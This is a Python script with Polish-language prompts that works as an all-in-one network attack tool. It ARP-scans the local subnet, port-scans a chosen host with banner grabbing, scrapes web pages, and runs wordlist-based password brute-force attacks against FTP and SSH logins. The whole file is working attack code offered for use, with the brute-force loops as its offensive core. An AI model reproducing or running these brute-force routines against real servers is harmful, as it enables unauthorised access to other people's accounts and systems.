import scapy.all as scapy
import sys, os, time, ipaddress
import socket
from bs4 import BeautifulSoup
import requests
from ftplib import FTP
import paramiko
import netifaces as ni
from netaddr import *

adrrip = ni.ifaddresses('eth0')[ni.AF_INET][0]['addr']
mask = IPNetwork(str(adrrip))
ip_addr = socket.gethostbyname(socket.gethostname())
adrip = adrrip + "/24"


def scan(ip):
	arp_req_frame = scapy.ARP(pdst = ip)
	broadcast_ether_frame = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")
	broadcast_ether_arp_req_frame = broadcast_ether_frame / arp_req_frame
	answered_list = scapy.srp(broadcast_ether_arp_req_frame, timeout = 1, verbose = False)[0]
	result = []
	for i in range(0,len(answered_list)):
		client_dict = {"ip" : answered_list[i][1].psrc}
		result.append(client_dict)

	return result
  
def display_result(result):
	print("-----------------------------------\nDotepne adresy IP w Twojej sieci\n-----------------------------------\n")
	x = 1
	print(f"Twoj adres IP: {adrrip} / Maska podsieci: {mask.netmask}")
	for i in result:
		
		print(f"{x}) ", i["ip"])
		x += 1

scanned_output = scan(adrip)
display_result(scanned_output)



remoteServer = input("\nPodaj IP hosta w celu skanowania portow: ")
remoteServerIP = socket.gethostbyname(remoteServer)
print("Prosze czekac, trwa skanowanie...", "\n")
a = 0

for i in range (1,5000):
	
	try:

		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		result = sock.connect_ex((remoteServerIP, i))
		banner = sock.recv(1024)
	

		print(f"Port {i}:    Open    {socket.getservbyport(i)}", "   ",banner.decode("utf-8"))
		a += 1
	except KeyboardInterrupt:
		print(" You pressed Ctrl+C")
		sys.exit()
	except:
		pass
if a == 0:
	
	print("-----------------------------------\nBrak otwartych portow\nRestart scryptu\n-----------------------------------\n")
	time. sleep(1)
	sys.stdout.flush()
	os.execl(sys.executable, 'python3', __file__, *sys.argv[1:])	

opc1 = input("\n-----------------------------------\nWybierz tryb\n----------------------------------- \n\n1 - WEB Grabber/Scrapper (http)\n2 - FTP BruteForce\n3 - SSH BruteForce\n\nWybieram: ")	

if opc1 == "1":

	url = "http://" + remoteServer 

	result = requests.get(url)
	doc = BeautifulSoup(result.text, "html.parser")

	images = [
	f"{url}{img['src']}" for img in doc.find_all("img")
	]

	
	opc = input("\n-----------------------------------\nDostepne opcje\n----------------------------------- \n\na - zapisz zawartosc strony  \nb - zapisz obrazy ze strony\nc - banner grabber\n\nWybieram: ")
	if opc.lower() == "a":
		
		print("\n-----------------------------------\nDeath Wall of Text\n-----------------------------------")
		print("\n","*"*65,"\n  Plik z zawartoscia strony zostal utworzony w aktualnym kalatogu\n\t\t      Nazwa: website_scrap.txt\n","*"*65,"\n") 
		page = doc.prettify()  
		file = open("website_scrap.txt", 'w')
		file.write(page)
		file.close()
	elif opc.lower() == "b":
		print("\n-----------------------------------\nZasysanie obrazow\n-----------------------------------\n")
		for image in images:
			print(f"Pobieranie {image}")
			with open(image.split("/")[-1], "wb") as img:
				img.write(requests.get(image).content)
		print("\n","*"*65,"\n  Plik z zawartoscia strony zostal utworzony w aktualnym kalatogu\n","*"*65,"\n")	
	elif opc.lower() == "c":

		t_host = str(url)
		headers = {"content-type": "multipart/form-data"}
		r = requests.post(t_host, headers=headers)

		print("\n-----------------------------------\nBanner Grabber\n-----------------------------------\n")
		print("Date: ",r.headers['date'])
		print("Server: ",r.headers['server'])
		print("Last-Modified: ",r.headers['last-modified'])
		print("Etag: ",r.headers['etag'])
		print("Accept-Ranges: ",r.headers['accept-ranges'])
		print("Content-Length: ",r.headers['content-length'])
		print("Vary: ",r.headers['vary'])
		print("Connection: ",r.headers['connection'])
		print("Content-Type: ",r.headers['content-Type'])
		
	else:
		print("Wybierz dostepna opcje")	

if opc1 == "2":
	print("\n-----------------------------------\nFTP BruteForce\n-----------------------------------\n")
	
	
	def main():
		target = remoteServer
		wordlist = input("Podaj sciezke do slownika: ")
		username = input("Podaj login: ")
		print("\n")
	
		if target and username and wordlist:
			Brute_force(target, username, wordlist)
		else:
			pass


	def Brute_force(target, username, wordlist):
		with open(wordlist, "r") as wordlist:
			word = wordlist.readline().strip()
			while word:
				Login_ftp(target, username, word)
				word = wordlist.readline().strip()

	def Login_ftp(target, username, word):
		print(f"Proba logowania dla {username}:{word}")
		ftp_session = FTP(target)
		try:
			ftp_session.login(username, word)
			ftp_session.quit()
			print(f"\n","*"*32,"\n  Znaleziono pasujaca kombinacje\n  Login:",username, "\n  Haslo:", word,"\n", "*"*32,"\n")
		except:
			ftp_session.quit()
			print("~~~~Nie znaleziono hasla~~~~\n")
	main()
		
if opc1 == "3":

	print("\n-----------------------------------\nSSH BruteForce\n-----------------------------------\n")
	
		
	def is_ssh_open(hostname, username, password):
	
		client = paramiko.SSHClient()

		client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
		try:
			client.connect(hostname=hostname, username=username, password=password, timeout=4)
		except socket.timeout:
        		
        		print(f"[!] Host: {hostname} is unreachable, timed out.")
        		return False
		
		except paramiko.AuthenticationException:
			print(f"Nie udana proba logowania dla {username}:{password}")
			return False
		except paramiko.SSHException:
        		print(f"Utrata polaczenia... restart za 60s")
        		
        		time.sleep(60)
        		return is_ssh_open(hostname, username, password)
	
		else:
	
	        	print(f"\n","*"*28,"\nZnaleziono pasujaca kombinacje\nLogin:",username,"\nHaslo:",password,"\n", "*"*28,"\n")
	        	exit(0)
	if __name__ == "__main__":	    
		host = remoteServer
		passlist = input("Podaj sciezke do slownika: ")
		user = input("Podaj login: ")
		print("\n")
		passlist = open(passlist).read().splitlines()
		for password in passlist:
			if is_ssh_open(host, user, password):
				None
			
	

		
		
